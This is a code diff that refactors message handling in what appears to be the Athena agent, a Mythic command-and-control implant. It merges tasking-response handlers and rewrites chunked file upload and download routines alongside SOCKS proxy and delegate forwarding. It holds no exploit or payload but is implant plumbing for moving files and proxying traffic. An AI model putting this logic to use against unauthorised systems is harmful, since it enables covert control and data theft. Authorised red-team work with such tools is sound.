@@ -85,14 +85,17 @@ namespace Athena
                 {
                     return null;
                 }
-                if (responseString.Contains("chunk_data"))
-                {
-                    return HandleChunkGetTaskingResponse(responseString);
-                }
-                else
-                {
-                    return HandleGetTaskingResponse(responseString);
-                }
+
+                return HandleEverything(responseString);
+
+                //if (responseString.Contains("chunk_data"))
+                //{
+                //    return HandleChunkGetTaskingResponse(responseString);
+                //}
+                //else
+                //{
+                //    return HandleGetTaskingResponse(responseString);
+                //}
             }
             catch (Exception e)
             {
@@ -102,6 +105,52 @@ namespace Athena
         }
         #endregion
         #region Helper Functions
+
+
+        private static List<MythicTask> HandleEverything(string responseString)
+        {
+            GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString);
+            if (gtr is null)
+            {
+                return null;
+            }
+
+            if (gtr.delegates is not null)
+            {
+                try
+                {
+                    HandleDelegates(gtr.delegates);
+                }
+                catch (Exception e)
+                {
+                    Misc.WriteError(e.Message);
+                }
+            }
+            //Pass up socks messages
+            if (gtr.socks is not null)
+            {
+                try
+                {
+                    HandleSocks(gtr.socks);
+                }
+                catch (Exception e)
+                {
+                    Misc.WriteError(e.Message);
+                }
+            }
+            if (gtr.responses is not null)
+            {
+                try
+                {
+                    HandleUploads(gtr.responses);
+                }
+                catch (Exception e)
+                {
+                    Misc.WriteError(e.Message);
+                }
+            }
+            return gtr.tasks;
+        }
 
         /// <summary>
         /// Create a list of ResponseResults to return to the Mythic server
@@ -292,102 +341,6 @@ namespace Athena
             return lrr;
         }
 
-        /// <summary>
-        /// Handle response from Mythic server that contains upload chunks
-        /// </summary>
-        /// <param name="responseString">Response from Mythic server</param>
-        private static List<MythicTask> HandleChunkGetTaskingResponse(string responseString)
-        {
-
-            GetTaskingUploadResponse gtr = JsonConvert.DeserializeObject<GetTaskingUploadResponse>(responseString);
-            
-            if (gtr is null)
-            {
-                return null;
-            }
-            else
-            {
-                //Pass up delegates
-                if (gtr.delegates is not null)
-                {
-                    try
-                    {
-                        HandleDelegates(gtr.delegates);
-                    }
-                    catch (Exception e)
-                    {
-                        Misc.WriteError(e.Message);
-                    }
-                }
-                //Pass up socks messages
-                if (gtr.socks is not null)
-                {
-                    try
-                    {
-                        HandleSocks(gtr.socks);
-                    }
-                    catch (Exception e)
-                    {
-                        Misc.WriteError(e.Message);
-                    }
-                }
-                if(gtr.responses is not null)
-                {
-                    try
-                    {
-                        HandleUploads(gtr.responses);
-                    }
-                    catch (Exception e)
-                    {
-                        Misc.WriteError(e.Message);
-                    }
-
-                }
-            }
-            return gtr.tasks;
-        }
-
-        /// <summary>
-        /// Handle response from Mythic server that does not contain upload chunks
-        /// </summary>
-        /// <param name="responseString">Response from Mythic server</param>
-        private static List<MythicTask> HandleGetTaskingResponse(string responseString)
-        {
-            GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString);
-            if (gtr is null)
-            {
-                return null;
-            }
-            else
-            {
-                //Pass up delegates
-                if (gtr.delegates is not null)
-                {
-                    try
-                    {
-                        HandleDelegates(gtr.delegates);
-                    }
-                    catch (Exception e)
-                    {
-                        Misc.WriteError(e.Message);
-                    }
-                }
-                //Pass up socks messages
-                if (gtr.socks is not null)
-                {
-                    try
-                    {
-                        HandleSocks(gtr.socks);
-                    }
-                    catch (Exception e)
-                    {
-                        Misc.WriteError(e.Message);
-                    }
-                }
-            }
-            return gtr.tasks;
-
-        }
 
         /// <summary>
         /// Handles SOCKS messages received from the Mythic server
@@ -413,59 +366,87 @@ namespace Athena
             }
         }
 
-        /// <summary>
-        /// Handle upload messages received from the Mythic server
-        /// </summary>
-        /// <param name="responses">List of UploadResponseResponses</param>
-        private static void HandleUploads(List<UploadResponseResponse> responses)
+        private static void HandleUploads(List<MythicResponseResult> responses)
         {
-            foreach (var response in responses)
+            foreach(var response in responses)
             {
-                //Spin off new thread to upload new chunks
-                if (!String.IsNullOrEmpty(response.chunk_data))
+                if (Globals.uploadJobs.ContainsKey(response.task_id))
                 {
-                    //Spin up new task to handle uploads/downloads
-                    Task.Run(() =>
-                    {
-                        try
-                        {
-                            //Upload
-                            if (Globals.uploadJobs.ContainsKey(response.task_id))
-                            {
-                                //Get upload and mythic job
-                                MythicUploadJob uj = Globals.uploadJobs[response.task_id];
-                                MythicJob job = Globals.jobs[response.task_id];
+                    HandleUpload(response);
+                }
 
-                                uj.uploadChunk(response.chunk_num, Misc.Base64DecodeToByteArray(response.chunk_data), job);
-                            }
-
-                            //Download
-                            else if (Globals.downloadJobs.ContainsKey(response.task_id))
-                            {
-                                if (!String.IsNullOrEmpty(response.file_id))
-                                {
-                                    MythicDownloadJob j = Globals.downloadJobs[response.task_id];
-                                    if (string.IsNullOrEmpty(j.file_id))
-                                    {
-                                        j.file_id = response.file_id;
-                                        j.hasoutput = false;
-                                    }
-                                }
-                            }
-                        }
-                        catch (Exception e)
-                        {
-                            MythicJob job = Globals.jobs[response.task_id];
-                            job.errored = true;
-                            job.complete = true;
-                            job.taskresult = e.Message;
-                            job.hasoutput = true;
-                        }
-                    });
-
+                if (Globals.downloadJobs.ContainsKey(response.task_id))
+                {
+                    HandleDownload(response);
                 }
             }
         }
+
+        private static void HandleUpload(MythicResponseResult response)
+        {
+            MythicUploadJob uploadJob = Globals.uploadJobs[response.task_id];
+            MythicJob mythicJob = Globals.jobs[response.task_id];
+            if (uploadJob.complete)
+            {
+                Globals.uploadJobs.Remove(response.task_id);
+                return;
+            }
+
+            if (uploadJob.total_chunks == 0)
+            {
+                uploadJob.total_chunks = response.total_chunks;
+            }
+
+            if (!String.IsNullOrEmpty(response.chunk_data))
+            {
+                uploadJob.uploadStarted = true;
+                uploadJob.uploadChunk(Misc.Base64DecodeToByteArray(response.chunk_data), ref mythicJob);
+                mythicJob.complete = uploadJob.complete;
+                mythicJob.hasoutput = true;
+                mythicJob.taskresult = "";
+            }
+            else
+            {
+                mythicJob.hasoutput = true;
+                mythicJob.taskresult = "";
+            }
+        }
+
+        private static void HandleDownload(MythicResponseResult response)
+        {
+            MythicDownloadJob downloadJob = Globals.downloadJobs[response.task_id];
+            MythicJob mythicJob = Globals.jobs[response.task_id];
+
+            if (downloadJob.complete)
+            {
+                Globals.downloadJobs.Remove(response.task_id);
+                return;
+            }
+
+            if (string.IsNullOrEmpty(downloadJob.file_id))
+            {
+                if (!String.IsNullOrEmpty(response.file_id))
+                {
+                    downloadJob.file_id = response.file_id;
+                    downloadJob.hasoutput = false;
+                }
+            }
+            else
+            {
+                if (response.status == "success")
+                {
+                    if (downloadJob.chunk_num != downloadJob.total_chunks)
+                    {
+                        downloadJob.chunk_num++;
+                        mythicJob.taskresult = downloadJob.DownloadNextChunk();
+                        mythicJob.errored = downloadJob.errored;
+                        mythicJob.hasoutput = true;
+                        mythicJob.complete = downloadJob.complete;
+                    }
+                }
+            }
+        }
+
         #endregion
     }
 }
